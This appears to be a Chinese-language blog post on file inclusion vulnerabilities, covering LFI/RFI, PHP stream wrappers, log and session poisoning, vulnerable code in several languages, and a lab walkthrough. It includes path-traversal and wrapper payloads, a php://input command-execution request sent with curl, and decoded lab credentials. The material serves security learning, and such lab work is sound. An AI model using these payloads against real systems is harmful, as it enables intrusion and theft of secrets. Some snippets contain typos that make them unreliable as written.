---
title: 文件、远程包含
date: 2026-03-30T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - 技术
  - 文件包含
---
## 原理

程序用一个可被用户控制的变量去做 “包含/引入文件” 的操作。比如 PHP 的 `include($_GET['page'])`，开发者本意是向根据参数动态加载页面模块，但没意识到 `include` 这个动作不只是读取文件内容，而是把目标文件当作代码来解析执行。这就是文件包含比普通任意文件读取危险的地方。任意文件读取指示泄露内容，而文件包含则会把被包含的文件当作 PHP 代码跑。

- LFI（本地文件包含）：包含的是服务器本地已有的文件，攻击者控制路径去读敏感文件或想办法执行已落地的代码。
- RFI（远程文件包含）：能包含远程 URL 上的文件，攻击者直接让服务器去加载自己服务器上的恶意脚本，等于直接 RCE。

RFI 的危害更大，但触发条件苛刻，PHP 需要 `allow_url_include` 开启（默认是关闭的）。

## 如何从 LFI 升级到 RCE

### 读取敏感文件

配合路径穿越 `../../../etc/passwd` 读取系统文件、读取源代码、配置文件。

### PHP 伪协议

- `php://filter`：读源码。因为直接 include 一个 `php` 文件会被执行而看不见源码，用 `php://filter/convertbase-encode/resource=config.php` 把源码 base64 编码后返回，就能审计源码、找数据库密码。
- `php://input`：把 POST body 当作代码执行（需要 `allow_url_include`），可以直接 RCE
- `data://`：`data://text/plain,<?php phpinfo();?>` 直接传入代码（需要 `allow_url_include`）

### 日志投毒

想办法把 PHP 代码写进一个能控制、且服务器会记录的文件，再用 LFI 去包含它执行。最常见的是污染 access.log，把恶意 PHP 代码塞进 User-Agent 头，服务器把这个 UA 原样记录进日志，然后 `?page=../../../var/log/apache2/access.log`，日志里的 `<?php ?>` 就被当代码执行了。SSH 的 authlog（把代码塞进用户名同理）。

### Session 文件包含

如果能控制写入 session 的值（比如某个参数会存进 `$_SESSION`），就包含 `/var/lib/php/sessions/sess_<PHP SESSID>` 来执行。

### /proc/self/environ、phpinfo 配合临时文件

老一些的环境里可以包含 `/proc/self/environ`（同样靠 UA 投毒），或配合 phpinfo 的 LFI to RCE 竞争上传临时文件。

## 存在漏洞的函数

### Include

只有代码执行到此才函数将文件包含起来，报错仅警告，但会继续执行。

### Require

只要程序运行立刻调用此函数包含文件，发生错误时输出错误信息并终止执行。

### Include_once

只调用一次。

### Require_once

只调用一次。

### 调用的条件

在 `php.ini` 中开启 `allow_url_include` ，如需远程包含还需开启 `allow_url_fopen`。

下面是一个存在包含的源码。

```php
<?php
$enil = @_$GET['file'];
include $enil;
?>
```

## PHP 伪协议

| 协议                | 用法         | 语法                                                            |
| ----------------- | ---------- | ------------------------------------------------------------- |
| file://           | 访问本地文件系统   | ?enil=file://etc/passwd                                       |
| ftp://            | 访问 ftp url | ?enil=ftp://enil@enil.com/README.md                           |
| http://           | 访问 http    | ?enil=http://enilmalus.github.io                              |
| data://           | 数据         | ?enil=data://text/plain,hello                                 |
| ssh2://           | ssh        | ?enil=ssh2.sftp://enil@enil.com/README.md                     |
| except://         | 处理交互式流     | ?enil=expect://whoami                                         |
| php://filter      | 输入输出       | ?enil=php://filter/convert.base64-encode/resource=./index.php |
| compress.bzip2:// | 压缩流        | ?enil=compress.zlib://C:/phpStudy/PHPTutorial/WWW/file.bz2    |

### php://filter

`php:filter/convert.base64-encode/resource=master.php`  是一个特殊的 URL 语法，用于在访问文件时对文件内容进行 `base64` 编码。

## 文件包含的几种情况

### PHP

在 PHP 中常常出现在 `include()` 函数中，下面是一个例子。

```php
if (isset($_GET['enil'])) {
	include($_GET['enil']);
}
```

### NodeJS

```NodeJS
if(req.query.enil) {
	fs.readFile(path.join(__dirname,req.query.enil), function (err,data) {
		res.write(data);
	});
}
```

```NodeJS
app.get("/about/:enil",function(req,res) {
	res.remder(`/${req.params.language}/about.html`);
});
```

### Java

```java
<c:if test="${not empty param.enil}">
	<jsp:include file="<%= request.getParameter('enil') %>">
</c:if>
```

### .NET

```.net
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['enil'])) { <% Response.WriteFile("<% HttpContext.Request.Query['enil'] %>"); %> }
```

## 例子

下面是一些简单的文件包含利用。

### 无过滤

![](Pasted%20image%2020260516160132.png)

### 非递归路径遍历过滤

![](Pasted%20image%2020260516160430.png)

访问被禁止了，尝试双写绕过。

![](Pasted%20image%2020260516160524.png)

依旧被过滤了。

尝试 url 编码。

![](Pasted%20image%2020260516160706.png)

![](Pasted%20image%2020260516160725.png)

依旧被过滤了。

观察到原文是以 `language` 开头，将 `language` 放在开头尝试绕过。

![](Pasted%20image%2020260516161003.png)

![](Pasted%20image%2020260516161254.png)

成功绕过。

### 输入滤波器

可以使用伪协议访问。

![](Pasted%20image%2020260516204100.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali/Bash]
└─$ echo "PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7" | base64 -d 
<?php

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

$config = array(
  'DB_HOST' => 'db.inlanefreight.local',
  'DB_USERNAME' => 'root',
  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
  'DB_DATABASE' => 'blogdb'
);

$API_KEY = "Awew242GDshrf46+35/k";
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Bash]
└─$ curl -s -X POST "http://154.57.164.74:32495/index.php?language=php://input" \
  --data '<?php system("id"); ?>'
...
...
                <li class="author"><a href="#">John Doe</a></li>
...
...
```